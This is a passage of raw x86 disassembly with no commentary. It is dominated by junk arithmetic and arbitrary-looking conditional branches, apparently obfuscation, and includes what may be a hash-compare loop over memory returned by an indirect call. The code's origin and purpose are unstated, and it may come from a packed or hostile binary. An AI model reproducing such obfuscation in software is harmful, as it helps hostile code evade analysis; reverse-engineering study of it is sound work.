  424cd0:	mov    DWORD PTR [ebp-0x14],eax
  424cd3:	mov    eax,0xc4
  424cd8:	add    DWORD PTR [ebp-0x14],eax
  424cdb:	mov    esi,DWORD PTR ds:0x438050
  424ce1:	and    ecx,eax
  424ce3:	sub    DWORD PTR [ebp-0x14],edi
  424ce6:	cmp    ebx,0xffffffbc
  424ce9:	je     0x424d29
  424ceb:	sub    edx,esi
  424ced:	sub    edx,ebx
  424cef:	or     ecx,esi
  424cf1:	cmp    edx,ecx
  424cf3:	jne    0x424d29
  424cf5:	mov    eax,0xe7e1
  424cfa:	add    DWORD PTR [ebp-0x14],eax
  424cfd:	cmp    edx,DWORD PTR ds:0x438074
  424d03:	jne    0x424d29
  424d05:	sub    edx,eax
  424d07:	mov    esi,0x9e89
  424d0c:	sub    DWORD PTR [ebp-0x14],esi
  424d0f:	mov    esi,0x45
  424d14:	add    ecx,edx
  424d16:	add    ecx,eax
  424d18:	cmp    ebx,edx
  424d1a:	jne    0x424d29
  424d1c:	and    DWORD PTR [ebp-0x14],esi
  424d1f:	add    ecx,ecx
  424d21:	cmp    ecx,DWORD PTR [ebp-0x20]
  424d24:	je     0x424d29
  424d26:	sub    DWORD PTR [ebp-0x14],ecx
  424d29:	call   0x4257f7
  424d2e:	sub    edi,eax
  424d30:	mov    ebx,DWORD PTR [ebp-0x14]
  424d33:	mov    edx,DWORD PTR [ebp-0x14]
  424d36:	sub    DWORD PTR [ebp-0x14],ebx
  424d39:	add    DWORD PTR [ebp-0x14],edx
  424d3c:	sub    edi,eax
  424d3e:	sub    DWORD PTR [ebp-0x14],edi
  424d41:	mov    DWORD PTR [ebp-0x4c],eax
  424d44:	mov    esi,0xbb
  424d49:	add    DWORD PTR [ebp-0x14],edx
  424d4c:	mov    ecx,DWORD PTR ds:0x438050
  424d52:	sub    ecx,ebx
  424d54:	or     DWORD PTR [ebp-0x14],ecx
  424d57:	cmp    edi,DWORD PTR [ebp-0x34]
  424d5a:	jne    0x424d64
  424d5c:	cmp    edi,DWORD PTR [ebp-0x10]
  424d5f:	jne    0x424d64
  424d61:	add    DWORD PTR [ebp-0x14],eax
  424d64:	or     DWORD PTR [ebp-0x14],esi
  424d67:	call   0x4257f7
  424d6c:	add    esi,ebx
  424d6e:	sub    esi,ebx
  424d70:	mov    edx,DWORD PTR [ebp-0x14]
  424d73:	or     DWORD PTR [ebp-0x14],esi
  424d76:	add    edx,ebx
  424d78:	test   edx,0xf6
  424d7e:	je     0x424db3
  424d80:	mov    ecx,DWORD PTR [ebp-0x14]
  424d83:	mov    ebx,DWORD PTR [ebp-0x14]
  424d86:	cmp    ebx,0xffffff8a
  424d89:	jne    0x424db3
  424d8b:	add    ebx,esi
  424d8d:	add    DWORD PTR [ebp-0x14],edx
  424d90:	mov    edx,0xfef6
  424d95:	add    ecx,eax
  424d97:	or     ecx,edx
  424d99:	cmp    ebx,DWORD PTR [ebp-0x3c]
  424d9c:	jne    0x424db3
  424d9e:	mov    esi,DWORD PTR [ebp-0x14]
  424da1:	mov    edx,DWORD PTR [ebp-0x14]
  424da4:	add    ecx,edx
  424da6:	add    ebx,edi
  424da8:	add    DWORD PTR [ebp-0x14],esi
  424dab:	and    ebx,eax
  424dad:	xor    DWORD PTR [ebp-0x14],ecx
  424db0:	xor    DWORD PTR [ebp-0x14],ebx
  424db3:	mov    DWORD PTR [ebp-0x4],eax
  424db6:	mov    edi,0xd0
  424dbb:	xor    ecx,ecx
  424dbd:	add    edi,edx
  424dbf:	add    ecx,esi
  424dc1:	sub    edi,edx
  424dc3:	add    edi,eax
  424dc5:	cmp    eax,0xffffffca
  424dc8:	je     0x424de4
  424dca:	add    edi,ebx
  424dcc:	cmp    esi,0x66
  424dcf:	je     0x424de4
  424dd1:	xor    DWORD PTR [ebp-0x14],edi
  424dd4:	cmp    eax,DWORD PTR [ebp-0x14]
  424dd7:	je     0x424de4
  424dd9:	test   ecx,0xbb
  424ddf:	je     0x424de4
  424de1:	xor    DWORD PTR [ebp-0x14],ecx
  424de4:	mov    ecx,DWORD PTR [ebp-0x4c]
  424de7:	sub    esi,edx
  424de9:	and    esi,edx
  424deb:	mov    edx,DWORD PTR [ebp-0x14]
  424dee:	mov    eax,DWORD PTR ds:0x43807c
  424df4:	add    DWORD PTR [ebp-0x14],edi
  424df7:	sub    eax,edi
  424df9:	and    esi,ecx
  424dfb:	add    DWORD PTR [ebp-0x14],esi
  424dfe:	sub    DWORD PTR [ebp-0x14],edx
  424e01:	add    DWORD PTR [ebp-0x14],edx
  424e04:	xor    DWORD PTR [ebp-0x14],eax
  424e07:	sub    ecx,DWORD PTR [ebp-0x18]
  424e0a:	add    DWORD PTR [ebp-0x14],ecx
  424e0d:	xor    ecx,0x94d66bc8
  424e13:	sub    DWORD PTR [ebp-0x14],ecx
  424e16:	mov    ebx,DWORD PTR [ebp-0x4]
  424e19:	mov    edx,edi
  424e1b:	or     edx,ebx
  424e1d:	mov    eax,DWORD PTR [ebp-0x14]
  424e20:	add    eax,esi
  424e22:	cmp    edx,edi
  424e24:	jne    0x42503c
  424e2a:	mov    esi,DWORD PTR [ebp-0x14]
  424e2d:	sub    esi,edx
  424e2f:	and    esi,edi
  424e31:	or     eax,ecx
  424e33:	cmp    eax,DWORD PTR ds:0x438040
  424e39:	je     0x42503c
  424e3f:	mov    edx,DWORD PTR [ebp-0x14]
  424e42:	cmp    esi,eax
  424e44:	jne    0x42503c
  424e4a:	sub    eax,ecx
  424e4c:	cmp    edx,DWORD PTR ds:0x438050
  424e52:	jne    0x42503c
  424e58:	sub    eax,ecx
  424e5a:	add    edx,eax
  424e5c:	add    esi,eax
  424e5e:	mov    eax,DWORD PTR [ebp-0x14]
  424e61:	mov    edi,DWORD PTR [ebp-0x14]
  424e64:	cmp    edi,0xffffffda
  424e67:	jne    0x42503c
  424e6d:	add    edx,edi
  424e6f:	mov    edi,DWORD PTR [ebp-0x14]
  424e72:	test   edx,0x8c
  424e78:	jne    0x42503c
  424e7e:	sub    DWORD PTR [ebp-0x14],edx
  424e81:	add    DWORD PTR [ebp-0x14],ecx
  424e84:	add    DWORD PTR [ebp-0x14],ecx
  424e87:	sub    DWORD PTR [ebp-0x14],eax
  424e8a:	test   esi,0x33
  424e90:	jne    0x42503c
  424e96:	mov    eax,0x45
  424e9b:	add    DWORD PTR [ebp-0x14],edi
  424e9e:	sub    eax,esi
  424ea0:	mov    edi,0x2d6d
  424ea5:	or     eax,edx
  424ea7:	sub    DWORD PTR [ebp-0x14],edx
  424eaa:	cmp    esi,ebx
  424eac:	je     0x42503c
  424eb2:	mov    esi,ebx
  424eb4:	sub    eax,ebx
  424eb6:	add    DWORD PTR [ebp-0x14],esi
  424eb9:	sub    DWORD PTR [ebp-0x14],eax
  424ebc:	mov    edx,0x255e
  424ec1:	and    edi,ebx
  424ec3:	cmp    eax,0xb296
  424ec8:	je     0x42503c
  424ece:	mov    eax,DWORD PTR ds:0x438070
  424ed4:	cmp    ecx,0x3600
  424eda:	jne    0x42503c
  424ee0:	mov    esi,DWORD PTR [ebp-0x14]
  424ee3:	sub    DWORD PTR [ebp-0x14],edx
  424ee6:	cmp    esi,DWORD PTR [ebp-0x44]
  424ee9:	jne    0x42503c
  424eef:	mov    edx,0x4b80188c
  424ef4:	sub    DWORD PTR [ebp-0x14],ecx
  424ef7:	sub    DWORD PTR [ebp-0x14],eax
  424efa:	sub    edx,ecx
  424efc:	cmp    edx,eax
  424efe:	jne    0x42503c
  424f04:	mov    eax,edi
  424f06:	sub    DWORD PTR [ebp-0x14],esi
  424f09:	mov    esi,DWORD PTR [ebp-0x14]
  424f0c:	add    esi,ebx
  424f0e:	add    edx,edi
  424f10:	test   edx,0xe7
  424f16:	je     0x42503c
  424f1c:	mov    edi,DWORD PTR [ebp-0x14]
  424f1f:	cmp    esi,0xffffffb1
  424f22:	je     0x42503c
  424f28:	cmp    esi,0xffffff86
  424f2b:	jne    0x42503c
  424f31:	sub    edi,ecx
  424f33:	and    edi,ecx
  424f35:	sub    edi,esi
  424f37:	cmp    edx,0x43663304
  424f3d:	jne    0x42503c
  424f43:	cmp    edi,0x89af
  424f49:	je     0x42503c
  424f4f:	mov    esi,DWORD PTR [ebp-0x14]
  424f52:	sub    DWORD PTR [ebp-0x14],eax
  424f55:	cmp    edx,0xffffffea
  424f58:	jne    0x42503c
  424f5e:	add    DWORD PTR [ebp-0x14],esi
  424f61:	add    edi,esi
  424f63:	and    edx,ecx
  424f65:	cmp    edi,ebx
  424f67:	je     0x42503c
  424f6d:	add    DWORD PTR [ebp-0x14],edi
  424f70:	mov    edi,ecx
  424f72:	sub    edx,ebx
  424f74:	add    edx,ebx
  424f76:	and    edx,edi
  424f78:	mov    esi,DWORD PTR [ebp-0x14]
  424f7b:	sub    DWORD PTR [ebp-0x14],edi
  424f7e:	cmp    esi,DWORD PTR ds:0x438084
  424f84:	jne    0x42503c
  424f8a:	add    DWORD PTR [ebp-0x14],edx
  424f8d:	mov    eax,DWORD PTR [ebp-0x14]
  424f90:	cmp    eax,DWORD PTR [ebp-0x40]
  424f93:	je     0x42503c
  424f99:	test   esi,0x7d
  424f9f:	je     0x42503c
  424fa5:	test   ecx,0x37
  424fab:	je     0x42503c
  424fb1:	cmp    eax,edi
  424fb3:	jne    0x42503c
  424fb9:	sub    DWORD PTR [ebp-0x14],ebx
  424fbc:	mov    edx,esi
  424fbe:	add    eax,ebx
  424fc0:	add    DWORD PTR [ebp-0x14],eax
  424fc3:	mov    edi,DWORD PTR [ebp-0x14]
  424fc6:	sub    DWORD PTR [ebp-0x14],edx
  424fc9:	add    edi,eax
  424fcb:	cmp    edi,edx
  424fcd:	jne    0x42503c
  424fcf:	cmp    edi,0x3c
  424fd2:	jne    0x42503c
  424fd4:	mov    eax,0x5322
  424fd9:	test   edi,0x6f
  424fdf:	jne    0x42503c
  424fe1:	add    eax,edx
  424fe3:	cmp    edi,DWORD PTR [ebp-0x3c]
  424fe6:	jne    0x42503c
  424fe8:	mov    edx,0x16
  424fed:	xor    esi,esi
  424fef:	cmp    eax,DWORD PTR ds:0x438084
  424ff5:	jne    0x42503c
  424ff7:	cmp    ebx,DWORD PTR [ebp-0x24]
  424ffa:	jne    0x42503c
  424ffc:	xor    DWORD PTR [ebp-0x14],ecx
  424fff:	test   edi,0x63
  425005:	jne    0x42503c
  425007:	mov    DWORD PTR [ebp-0x14],edi
  42500a:	mov    edi,0x59
  42500f:	or     eax,ecx
  425011:	mov    DWORD PTR [ebp-0x14],eax
  425014:	and    DWORD PTR [ebp-0x14],edx
  425017:	add    esi,ecx
  425019:	test   esi,0x3b
  42501f:	jne    0x42503c
  425021:	mov    eax,DWORD PTR ds:0x438040
  425027:	mov    edx,DWORD PTR [ebp-0x14]
  42502a:	add    edx,ebx
  42502c:	add    DWORD PTR [ebp-0x14],edi
  42502f:	sub    DWORD PTR [ebp-0x14],eax
  425032:	and    DWORD PTR [ebp-0x14],edx
  425035:	and    esi,ebx
  425037:	sub    esi,ebx
  425039:	sub    DWORD PTR [ebp-0x14],esi
  42503c:	sub    ebx,DWORD PTR [ebp-0x4c]
  42503f:	sub    edx,edi
  425041:	cmp    edx,DWORD PTR [ebp-0x44]
  425044:	jne    0x425354
  42504a:	mov    eax,DWORD PTR ds:0x438070
  425050:	mov    edi,0x8498
  425055:	sub    DWORD PTR [ebp-0x14],ebx
  425058:	and    eax,edx
  42505a:	and    edi,eax
  42505c:	cmp    ebx,DWORD PTR [ebp-0x24]
  42505f:	je     0x425354
  425065:	mov    edx,0x59
  42506a:	cmp    edi,esi
  42506c:	je     0x425354
  425072:	sub    DWORD PTR [ebp-0x14],edi
  425075:	sub    edx,edi
  425077:	cmp    eax,esi
  425079:	jne    0x425354
  42507f:	sub    edx,eax
  425081:	xor    eax,eax
  425083:	sub    DWORD PTR [ebp-0x14],edx
  425086:	cmp    esi,DWORD PTR [ebp-0x10]
  425089:	jne    0x425354
  42508f:	sub    esi,ebx
  425091:	sub    esi,edx
  425093:	mov    edi,DWORD PTR [ebp-0x14]
  425096:	mov    edx,DWORD PTR [ebp-0x14]
  425099:	cmp    edx,0xffffffc8
  42509c:	je     0x425354
  4250a2:	and    edx,eax
  4250a4:	sub    DWORD PTR [ebp-0x14],esi
  4250a7:	mov    eax,DWORD PTR [ebp-0x14]
  4250aa:	mov    esi,DWORD PTR [ebp-0x14]
  4250ad:	add    eax,esi
  4250af:	or     edx,ecx
  4250b1:	add    DWORD PTR [ebp-0x14],ecx
  4250b4:	add    DWORD PTR [ebp-0x14],ecx
  4250b7:	cmp    edx,DWORD PTR [ebp-0x44]
  4250ba:	je     0x425354
  4250c0:	mov    esi,eax
  4250c2:	mov    eax,0x43200414
  4250c7:	mov    DWORD PTR [ebp-0x14],edi
  4250ca:	cmp    esi,0x16
  4250cd:	jne    0x425354
  4250d3:	sub    DWORD PTR [ebp-0x14],edi
  4250d6:	mov    edi,0xea
  4250db:	sub    edi,edx
  4250dd:	mov    edx,DWORD PTR ds:0x4380b0
  4250e3:	and    eax,ebx
  4250e5:	add    edx,ecx
  4250e7:	add    DWORD PTR [ebp-0x14],ebx
  4250ea:	cmp    edi,0x48
  4250ed:	jne    0x425354
  4250f3:	add    edx,ecx
  4250f5:	add    edx,edi
  4250f7:	add    edx,esi
  4250f9:	add    eax,eax
  4250fb:	sub    eax,ecx
  4250fd:	sub    DWORD PTR [ebp-0x14],edx
  425100:	sub    eax,ebx
  425102:	and    eax,edi
  425104:	sub    eax,edx
  425106:	sub    eax,ecx
  425108:	cmp    edx,0x324b
  42510e:	jne    0x425354
  425114:	mov    edi,0x29
  425119:	cmp    ecx,0xffffff8c
  42511c:	je     0x425354
  425122:	mov    DWORD PTR [ebp-0x14],edi
  425125:	mov    esi,0x45068524
  42512a:	mov    edx,DWORD PTR [ebp-0x14]
  42512d:	test   ecx,0x6cba
  425133:	jne    0x425354
  425139:	mov    DWORD PTR [ebp-0x14],edx
  42513c:	add    eax,ebx
  42513e:	sub    eax,edi
  425140:	add    eax,eax
  425142:	cmp    eax,DWORD PTR [ebp-0x48]
  425145:	jne    0x425354
  42514b:	cmp    eax,DWORD PTR [ebp-0x30]
  42514e:	jne    0x425354
  425154:	cmp    eax,DWORD PTR ds:0x438074
  42515a:	je     0x425354
  425160:	sub    eax,esi
  425162:	mov    edi,0xc7c3
  425167:	add    DWORD PTR [ebp-0x14],edi
  42516a:	mov    edx,edi
  42516c:	sub    eax,edx
  42516e:	cmp    eax,0xffffffea
  425171:	jne    0x425354
  425177:	mov    edx,0xe6
  42517c:	sub    edx,edi
  42517e:	xor    edi,edi
  425180:	sub    edi,ecx
  425182:	and    edi,edx
  425184:	sub    DWORD PTR [ebp-0x14],esi
  425187:	sub    eax,ebx
  425189:	sub    DWORD PTR [ebp-0x14],edi
  42518c:	cmp    eax,DWORD PTR ds:0x43807c
  425192:	je     0x425354
  425198:	test   eax,0x92
  42519d:	je     0x425354
  4251a3:	mov    edi,esi
  4251a5:	sub    eax,edx
  4251a7:	sub    DWORD PTR [ebp-0x14],eax
  4251aa:	mov    edx,DWORD PTR [ebp-0x14]
  4251ad:	add    DWORD PTR [ebp-0x14],esi
  4251b0:	cmp    ecx,0x75
  4251b3:	je     0x425354
  4251b9:	add    edi,ebx
  4251bb:	mov    esi,DWORD PTR ds:0x438040
  4251c1:	mov    eax,DWORD PTR [ebp-0x14]
  4251c4:	and    edx,ebx
  4251c6:	sub    edi,ecx
  4251c8:	add    eax,edx
  4251ca:	add    edi,edx
  4251cc:	cmp    edx,eax
  4251ce:	jne    0x425354
  4251d4:	add    DWORD PTR [ebp-0x14],eax
  4251d7:	xor    eax,eax
  4251d9:	mov    edx,DWORD PTR [ebp-0x14]
  4251dc:	add    DWORD PTR [ebp-0x14],esi
  4251df:	cmp    edi,0xbad
  4251e5:	jne    0x425354
  4251eb:	add    edi,edi
  4251ed:	mov    esi,DWORD PTR [ebp-0x14]
  4251f0:	and    edi,ebx
  4251f2:	mov    eax,0xa376
  4251f7:	and    eax,esi
  4251f9:	cmp    edx,0xffffffd9
  4251fc:	je     0x425354
  425202:	sub    DWORD PTR [ebp-0x14],eax
  425205:	mov    eax,0xe204
  42520a:	mov    esi,DWORD PTR ds:0x438050
  425210:	sub    DWORD PTR [ebp-0x14],eax
  425213:	sub    DWORD PTR [ebp-0x14],edx
  425216:	and    DWORD PTR [ebp-0x14],edx
  425219:	sub    DWORD PTR [ebp-0x14],esi
  42521c:	cmp    edi,esi
  42521e:	je     0x425354
  425224:	test   edi,0x51
  42522a:	je     0x425354
  425230:	cmp    ecx,DWORD PTR [ebp-0x38]
  425233:	jne    0x425354
  425239:	xor    esi,esi
  42523b:	sub    DWORD PTR [ebp-0x14],edx
  42523e:	add    DWORD PTR [ebp-0x14],esi
  425241:	mov    edx,DWORD PTR [ebp-0x14]
  425244:	cmp    edx,0x76
  425247:	jne    0x425354
  42524d:	cmp    edi,DWORD PTR [ebp-0x44]
  425250:	jne    0x425354
  425256:	mov    eax,edi
  425258:	cmp    eax,edi
  42525a:	jne    0x425354
  425260:	cmp    edx,ecx
  425262:	jne    0x425354
  425268:	mov    esi,DWORD PTR [ebp-0x14]
  42526b:	cmp    edx,edi
  42526d:	jne    0x425354
  425273:	mov    edi,DWORD PTR [ebp-0x14]
  425276:	test   esi,0x5
  42527c:	jne    0x425354
  425282:	and    DWORD PTR [ebp-0x14],eax
  425285:	sub    DWORD PTR [ebp-0x14],edi
  425288:	test   eax,0x4b
  42528d:	jne    0x425354
  425293:	sub    edx,eax
  425295:	cmp    edx,0xa570
  42529b:	jne    0x425354
  4252a1:	mov    edi,DWORD PTR [ebp-0x14]
  4252a4:	xor    eax,eax
  4252a6:	sub    DWORD PTR [ebp-0x14],ecx
  4252a9:	sub    edx,ecx
  4252ab:	sub    edx,edi
  4252ad:	add    esi,ebx
  4252af:	cmp    edx,DWORD PTR ds:0x438040
  4252b5:	je     0x425354
  4252bb:	mov    edi,DWORD PTR [ebp-0x14]
  4252be:	cmp    edx,DWORD PTR ds:0x438050
  4252c4:	je     0x425354
  4252ca:	cmp    esi,DWORD PTR [ebp-0x38]
  4252cd:	jne    0x425354
  4252d3:	sub    eax,ebx
  4252d5:	sub    edi,eax
  4252d7:	or     DWORD PTR [ebp-0x14],eax
  4252da:	test   esi,0xd2
  4252e0:	jne    0x425354
  4252e2:	cmp    edx,eax
  4252e4:	jne    0x425354
  4252e6:	mov    eax,DWORD PTR [ebp-0x14]
  4252e9:	cmp    eax,DWORD PTR [ebp-0x3c]
  4252ec:	jne    0x425354
  4252ee:	and    edx,ebx
  4252f0:	or     eax,ebx
  4252f2:	test   eax,0x7c3b
  4252f7:	je     0x425354
  4252f9:	cmp    edi,eax
  4252fb:	jne    0x425354
  4252fd:	sub    DWORD PTR [ebp-0x14],ecx
  425300:	sub    DWORD PTR [ebp-0x14],esi
  425303:	cmp    edx,0x8858
  425309:	je     0x425354
  42530b:	cmp    eax,esi
  42530d:	je     0x425354
  42530f:	mov    esi,0xb6
  425314:	xor    DWORD PTR [ebp-0x14],edx
  425317:	sub    esi,ecx
  425319:	and    eax,edi
  42531b:	cmp    esi,DWORD PTR [ebp-0x8]
  42531e:	je     0x425354
  425320:	cmp    eax,DWORD PTR ds:0x438050
  425326:	jne    0x425354
  425328:	mov    edi,DWORD PTR [ebp-0x14]
  42532b:	add    DWORD PTR [ebp-0x14],edi
  42532e:	add    eax,edx
  425330:	mov    edi,DWORD PTR [ebp-0x14]
  425333:	cmp    esi,DWORD PTR [ebp-0xc]
  425336:	jne    0x425354
  425338:	add    DWORD PTR [ebp-0x14],ecx
  42533b:	mov    edx,eax
  42533d:	cmp    eax,DWORD PTR [ebp-0x30]
  425340:	jne    0x425354
  425342:	cmp    eax,DWORD PTR [ebp-0x8]
  425345:	je     0x425354
  425347:	add    esi,ebx
  425349:	add    DWORD PTR [ebp-0x14],esi
  42534c:	add    DWORD PTR [ebp-0x14],edi
  42534f:	sub    edx,ecx
  425351:	sub    DWORD PTR [ebp-0x14],edx
  425354:	xor    ebx,0x94d66bcd
  42535a:	mov    edx,DWORD PTR ds:0x438074
  425360:	add    DWORD PTR [ebp-0x14],ebx
  425363:	sub    edx,edi
  425365:	sub    DWORD PTR [ebp-0x14],edx
  425368:	cmp    ecx,ebx
  42536a:	je     0x4255bb
  425370:	cmp    edx,0x11
  425373:	jne    0x425380
  425375:	cmp    eax,DWORD PTR ds:0x43807c
  42537b:	jne    0x425380
  42537d:	add    DWORD PTR [ebp-0x14],ebx
  425380:	push   0x438050
  425385:	call   DWORD PTR ds:0x435a0c
  42538b:	cmp    esi,eax
  42538d:	jne    0x4253ae
  42538f:	cmp    eax,DWORD PTR [ebp-0x3c]
  425392:	jne    0x4253ae
  425394:	mov    edi,DWORD PTR [ebp-0x14]
  425397:	add    edi,edi
  425399:	cmp    edi,0x82e3
  42539f:	jne    0x4253ae
  4253a1:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a4:	sub    DWORD PTR [ebp-0x14],edi
  4253a7:	cmp    edi,ecx
  4253a9:	jne    0x4253ae
  4253ab:	or     DWORD PTR [ebp-0x14],ecx
  4253ae:	or     eax,eax
  4253b0:	je     0x4255bb
  4253b6:	cmp    ecx,esi
  4253b8:	jne    0x4253bd
  4253ba:	add    DWORD PTR [ebp-0x14],ebx
  4253bd:	add    DWORD PTR [ebp-0x28],0x18d6dd58
  4253c4:	mov    ecx,DWORD PTR [ebp-0x14]
  4253c7:	xor    edx,edx
  4253c9:	add    DWORD PTR [ebp-0x14],ecx
  4253cc:	sub    DWORD PTR [ebp-0x14],edx
  4253cf:	lea    ebx,[eax+0x5b1]
  4253d5:	sub    eax,esi
  4253d7:	mov    edi,DWORD PTR [ebp-0x14]
  4253da:	cmp    eax,DWORD PTR ds:0x43807c
  4253e0:	jne    0x425448
  4253e2:	mov    esi,DWORD PTR [ebp-0x14]
  4253e5:	mov    ecx,DWORD PTR ds:0x4380b0
  4253eb:	cmp    esi,DWORD PTR ds:0x438040
  4253f1:	je     0x425448
  4253f3:	sub    ecx,esi
  4253f5:	mov    esi,DWORD PTR [ebp-0x14]
  4253f8:	mov    edx,DWORD PTR [ebp-0x14]
  4253fb:	or     DWORD PTR [ebp-0x14],ebx
  4253fe:	add    eax,eax
  425400:	and    edx,ecx
  425402:	sub    edx,ecx
  425404:	add    DWORD PTR [ebp-0x14],eax
  425407:	add    edx,ecx
  425409:	sub    DWORD PTR [ebp-0x14],edx
  42540c:	sub    edi,ebx
  42540e:	cmp    edi,DWORD PTR ds:0x438084
  425414:	je     0x425448
  425416:	add    DWORD PTR [ebp-0x14],edi
  425419:	cmp    esi,DWORD PTR ds:0x438074
  42541f:	jne    0x425448
  425421:	mov    eax,DWORD PTR [ebp-0x14]
  425424:	mov    edi,DWORD PTR [ebp-0x14]
  425427:	cmp    edi,DWORD PTR ds:0x438074
  42542d:	je     0x425448
  42542f:	mov    ecx,0x4d
  425434:	add    DWORD PTR [ebp-0x14],eax
  425437:	mov    eax,DWORD PTR ds:0x438050
  42543d:	sub    ecx,esi
  42543f:	or     DWORD PTR [ebp-0x14],edi
  425442:	sub    DWORD PTR [ebp-0x14],ecx
  425445:	sub    DWORD PTR [ebp-0x14],eax
  425448:	inc    ebx
  425449:	mov    ecx,DWORD PTR ds:0x438050
  42544f:	mov    edx,0xe8
  425454:	add    DWORD PTR [ebp-0x14],ebx
  425457:	add    DWORD PTR [ebp-0x14],edi
  42545a:	cmp    edi,0xffffffd3
  42545d:	jne    0x42549a
  42545f:	mov    edi,eax
  425461:	add    edi,edx
  425463:	sub    ecx,ebx
  425465:	cmp    ecx,0x1b2c5849
  42546b:	jne    0x42549a
  42546d:	xor    edx,edx
  42546f:	sub    ecx,esi
  425471:	cmp    ecx,0xd16
  425477:	jne    0x42549a
  425479:	cmp    ebx,DWORD PTR ds:0x43807c
  42547f:	jne    0x42549a
  425481:	cmp    ecx,DWORD PTR ds:0x438040
  425487:	je     0x42549a
  425489:	sub    edi,edx
  42548b:	or     DWORD PTR [ebp-0x14],ecx
  42548e:	mov    ecx,DWORD PTR [ebp-0x14]
  425491:	add    DWORD PTR [ebp-0x14],ecx
  425494:	add    DWORD PTR [ebp-0x14],ebx
  425497:	sub    DWORD PTR [ebp-0x14],edi
  42549a:	mov    edi,DWORD PTR [ebx]
  42549c:	mov    ecx,0x7c
  4254a1:	add    DWORD PTR [ebp-0x14],edi
  4254a4:	mov    edx,0xfe
  4254a9:	or     DWORD PTR [ebp-0x14],ecx
  4254ac:	add    DWORD PTR [ebp-0x14],edx
  4254af:	sub    edi,0x7621ee1a
  4254b5:	xor    ecx,ecx
  4254b7:	mov    edx,DWORD PTR ds:0x438070
  4254bd:	mov    DWORD PTR [ebp-0x2c],edx
  4254c0:	sub    ecx,eax
  4254c2:	sub    ecx,edi
  4254c4:	cmp    ecx,0xc1f9
  4254ca:	jne    0x4254d8
  4254cc:	xor    edx,edx
  4254ce:	sub    ecx,edx
  4254d0:	cmp    ecx,0x2b
  4254d3:	jne    0x4254d8
  4254d5:	sub    DWORD PTR [ebp-0x2c],ecx
  4254d8:	cmp    edi,0x48e385f6
  4254de:	jne    0x4253d5
  4254e4:	mov    eax,DWORD PTR [ebp-0x2c]
  4254e7:	cmp    eax,0xffffffd8
  4254ea:	jne    0x4255a5
  4254f0:	mov    edx,DWORD PTR ds:0x438074
  4254f6:	sub    edx,ecx
  4254f8:	mov    esi,0xe785
  4254fd:	and    edx,eax
  4254ff:	and    edx,ecx
  425501:	or     DWORD PTR [ebp-0x2c],edx
  425504:	add    esi,ecx
  425506:	add    esi,ecx
  425508:	xor    DWORD PTR [ebp-0x14],ebx
  42550b:	add    esi,edx
  42550d:	test   esi,0x5a
  425513:	je     0x4255a5
  425519:	sub    esi,ecx
  42551b:	xor    edi,edi
  42551d:	sub    edi,eax
  42551f:	mov    ecx,DWORD PTR [ebp-0x14]
  425522:	add    DWORD PTR [ebp-0x2c],esi
  425525:	sub    edi,eax
  425527:	cmp    edx,esi
  425529:	jne    0x4255a5
  42552b:	mov    edx,0xa8
  425530:	and    edx,eax
  425532:	cmp    ecx,DWORD PTR ds:0x4380b0
  425538:	jne    0x4255a5
  42553a:	add    ecx,ebx
  42553c:	mov    esi,DWORD PTR [ebp-0x14]
  42553f:	or     edi,edx
  425541:	mov    edx,DWORD PTR [ebp-0x14]
  425544:	add    DWORD PTR [ebp-0x2c],ecx
  425547:	sub    DWORD PTR [ebp-0x2c],edi
  42554a:	test   esi,0x2
  425550:	jne    0x4255a5
  425552:	sub    edx,edi
  425554:	add    DWORD PTR [ebp-0x2c],esi
  425557:	sub    edx,ebx
  425559:	mov    eax,ecx
  42555b:	mov    edi,DWORD PTR [ebp-0x2c]
  42555e:	and    edi,ecx
  425560:	cmp    edi,0x0
  425563:	jne    0x4255a5
  425565:	sub    DWORD PTR [ebp-0x2c],eax
  425568:	cmp    edi,DWORD PTR [ebp-0x8]
  42556b:	je     0x4255a5
  42556d:	cmp    edi,DWORD PTR [ebp-0x44]
  425570:	je     0x4255a5
  425572:	and    edx,esi
  425574:	add    edi,edx
  425576:	xor    esi,esi
  425578:	mov    edx,DWORD PTR ds:0x438084
  42557e:	sub    esi,eax
  425580:	cmp    esi,0x64
  425583:	jne    0x4255a5
  425585:	sub    esi,edi
  425587:	sub    esi,eax
  425589:	mov    edi,DWORD PTR [ebp-0x14]
  42558c:	xor    eax,eax
  42558e:	sub    DWORD PTR [ebp-0x2c],edi
  425591:	sub    DWORD PTR [ebp-0x2c],eax
  425594:	or     edx,esi
  425596:	add    edx,edx
  425598:	add    edx,edx
  42559a:	cmp    edx,0xb327
  4255a0:	jne    0x4255a5
  4255a2:	xor    DWORD PTR [ebp-0x2c],edx
  4255a5:	mov    edi,DWORD PTR [ebx+0x4]
  4255a8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255ab:	mov    edx,DWORD PTR [ebp-0x14]
  4255ae:	sub    edx,edi
  4255b0:	add    ecx,edx
  4255b2:	add    DWORD PTR [ebp-0x2c],edi
  4255b5:	add    DWORD PTR [ebp-0x2c],ecx
  4255b8:	sub    DWORD PTR [ebp-0x28],edi
  4255bb:	sub    ecx,ebx
  4255bd:	sub    ecx,esi
  4255bf:	sub    DWORD PTR [ebp-0x14],ecx
  4255c2:	test   edi,0xe2
  4255c8:	je     0x4255df
  4255ca:	or     edx,eax
  4255cc:	mov    ecx,DWORD PTR [ebp-0x2c]
  4255cf:	mov    eax,DWORD PTR [ebp-0x14]
  4255d2:	add    ecx,ebx
  4255d4:	and    edx,ecx
  4255d6:	sub    edx,eax
  4255d8:	sub    edx,eax
  4255da:	add    edx,eax
  4255dc:	add    DWORD PTR [ebp-0x14],edx
  4255df:	mov    edi,DWORD PTR [ebp+0xc]
  4255e2:	mov    ecx,ebx
  4255e4:	test   edi,0x6e
  4255ea:	je     0x4256c1
  4255f0:	test   edi,0xb820843
  4255f6:	jne    0x4256c1
  4255fc:	mov    esi,DWORD PTR [ebp-0x14]
  4255ff:	cmp    ecx,0x5508
  425605:	je     0x4256c1
  42560b:	add    DWORD PTR [ebp-0x14],esi
  42560e:	sub    DWORD PTR [ebp-0x14],edi
  425611:	add    ecx,esi
  425613:	mov    edx,DWORD PTR [ebp-0x14]
  425616:	mov    esi,DWORD PTR [ebp-0x2c]
  425619:	mov    DWORD PTR [ebp-0x2c],ecx
  42561c:	cmp    esi,edx
  42561e:	je     0x4256c1
  425624:	and    DWORD PTR [ebp-0x2c],edx
  425627:	cmp    esi,0xffffffbd
  42562a:	je     0x4256c1
  425630:	xor    eax,eax
  425632:	sub    DWORD PTR [ebp-0x14],esi
  425635:	mov    ecx,0x7806046
  42563a:	and    eax,esi
